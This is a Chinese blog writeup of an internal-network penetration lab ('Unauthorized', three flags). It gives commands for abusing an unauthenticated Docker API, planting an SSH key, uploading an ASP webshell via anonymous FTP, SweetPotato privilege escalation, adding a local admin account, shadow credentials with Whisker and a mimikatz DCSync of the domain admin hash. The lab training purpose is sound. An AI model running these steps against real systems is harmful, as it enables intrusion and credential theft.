---
title: 春秋云镜-【仿真场景】Unauthorized writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17187348.html
source: 博客园 - 渗透测试中心
date: 2023-03-08
fetch_date: 2025-10-04T08:55:17.185065
---

# 春秋云镜-【仿真场景】Unauthorized writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [春秋云镜-【仿真场景】Unauthorized writeup](https://www.cnblogs.com/backlion/p/17187348.html "发布于 2023-03-07 11:05")

## 说明

Unauthorized是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。

## 技术

FTP、Privilege Elevation、AD CS、Kerberos、域渗透

## 第一个flag

### docker 未授权

通过外网信息收集，发现docker未授权

[https://cloud.tencent.com/developer/article/1744943](https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/1744943)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110439373-897625583.png)

查看镜像

```
docker -H tcp://47.92.7.138:2375 images
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110440125-1811605968.png)

查看容器

```
docker -H tcp://47.92.7.138:2375 ps -a
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110440734-1869544517.png)

启动容器并将宿主机磁盘挂载到/mnt

```
docker -H tcp://47.92.7.138:2375 run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110441418-169215008.png)

### 写入公钥

在vps上生成秘钥，敲下回车后会有3个交互，第一个是文件名，默认是id\_rsa，如需修改，自己输入一个文件名便可。第二与第三是密码与确认密码，是以后使用该公钥时要输入的密码，一般不设置，如有强烈的安全需求，自己设置便可。最后会生成两个文件id\_rsa，id\_rsa.pub。以.pub结尾的是公钥，另一个是私钥

```
ssh-keygen -t rsa
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110442223-521307798.png)

将公钥其写入到目标机器宿主机的/root/.ssh/authorized\_keys文件中

```
cd /mnt/root/.ssh/
echo "ssh-rsa AAAAB3NzaC1yc2......." > authorized_keys
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110443198-1135312253.png)

可以本地直接用私钥登录ssh

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110443995-1365905384.png)

查找flag，提示flag并不在这里

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110444805-1391905342.png)

### mysql弱口令

查看本机开放的端口

```
netstat -aptn
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110445835-921831822.png)

查看历史命令，找到mysql密码为123456，其实爆破也能爆破出来

```
history
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110446520-658369048.png)

访问mysql数据库

```
mysql -uroot -p123456

mysql> show databases;
mysql> use secret;
mysql> show tables;
mysql> select * from f1agggg01
```

获得第一个flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110447244-1248407839.png)

## ‍第二个flag

### 横向渗透

上传npc设置代理，fscan扫描 172.22.7.0/24

```
172.22.7.67:8081 open
172.22.7.13:80 open
172.22.7.13:22 open
172.22.7.67:445 open
172.22.7.31:445 open
172.22.7.67:21 open
172.22.7.6:445 open
172.22.7.67:80 open
172.22.7.67:139 open
172.22.7.31:139 open
172.22.7.6:139 open
172.22.7.31:135 open
172.22.7.67:135 open
172.22.7.6:135 open
172.22.7.6:88 open
172.22.7.13:2375 open
[+] NetInfo:
[*]172.22.7.6
   [->]DC02
   [->]172.22.7.6
[*] 172.22.7.67          XIAORANG\WIN-9BMCSG0S
[*] WebTitle:http://172.22.7.13        code:200 len:27170  title:某某装饰
[+] NetInfo:
[*]172.22.7.67
   [->]WIN-9BMCSG0S
   [->]172.22.7.67
[+] NetInfo:
[*]172.22.7.31
   [->]ADCS
   [->]172.22.7.31
[*] 172.22.7.31          XIAORANG\ADCS
[*] 172.22.7.6     [+]DC XIAORANG\DC02
[*] WebTitle:http://172.22.7.13:2375   code:404 len:29     title:None
[+] ftp://172.22.7.67:21:anonymous
   [->]1-1P3201024310-L.zip
   [->]1-1P320102603C1.zip
   [->]1-1P320102609447.zip
   [->]1-1P320102615Q3.zip
   [->]1-1P320102621J7.zip
   [->]1-1P320102J30-L.zip
[*] WebTitle:http://172.22.7.67        code:200 len:703    title:IIS Windows Server
[*] WebTitle:http://172.22.7.67:8081   code:200 len:4621   title:公司管理后台
[+] http://172.22.7.13:2375 poc-yaml-docker-api-unauthorized-rce
[+] http://172.22.7.67:8081/www.zip poc-yaml-backup-file
[+] http://172.22.7.13:2375 poc-yaml-go-pprof-leak
```

### FTP未授权

发现了[http://172.22.7.67:8081/www.zip](https://link.zhihu.com/?target=http%3A//172.22.7.67%3A8081/www.zip) 备份压缩包 ，解压后发现download的文件夹与匿名登录的ftp的共享文件一致

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110448166-1687460793.png)

因此可以通过ftp上传 webshell

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110449088-758201621.png)

shell地址

```
http://172.22.7.67:8081/download/shell.asp
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110449800-657193850.png)

直接使用土豆提权，上传SweetPotato.exe

```
SweetPotato.exe -a "whoami"
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110450532-2131991191.png)

经测试3389是开启的，直接添加账号然后登录

```
SweetPotato.exe -a "net user devyn Admin@123 /add"
SweetPotato.exe -a "net localgroup administrators devyn /add"
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110451238-67786808.png)

获取flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110451947-1217760269.png)

## ‍第三个flag

注意此新建的用户无法执行域命令，所以需要查询到域账号，然后使用PTH登录，如果找到密码可以直接登录，其实也可以直接在shell中执行mimikatz抓取Hash，这边远程桌面使用cmd执行方便一点

抓取到了域账户 zhangfeng/FenzGTaVF6En，重新使用域账号登录，注意用户名要填写 zhangfeng@xiaorang.lab

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110452716-534730590.png)

### shadow-credentials

[https://wiki.whoamianony.top/active-directory-methodology/shadow-credentials](https://link.zhihu.com/?target=https%3A//wiki.whoamianony.top/active-directory-methodology/shadow-credentials)

以下账户拥有 msDS-KeyCredentialLink 属性的写入权限：

* 域管理员账户
* Key Admins 组中的账户
* Enterprise Key Admins 组中的账户
* 对 Active Directory 中的对象具有 GenericAll 或 GenericWrite 权限的帐户
* 机器账户对自身的 msDS-KeyCredentialLink 属性拥有写入权限

zhangfeng账户在Key Admins组中，具有写入权限

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110453410-454769109.png)

向域控制器的 msDS-KeyCredentialLink 属性添加 Shadow Credentials

```
Whisker.exe add /target:DC02$ /domain:xiaorang.lab /dc:DC02.xiaorang.lab
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110454285-1911397589.png)

添加成功后，程序提示命令，基于证书的身份验证请求TGT票据，注意提示命令的最后加上 /ptt

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110455197-1657870621.png)

域控制器账户拥有特权，可以使用 Mimikatz 执行 DCSync 来导出域管哈希

```
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab /user:Administrator" exit
```

![](https:/...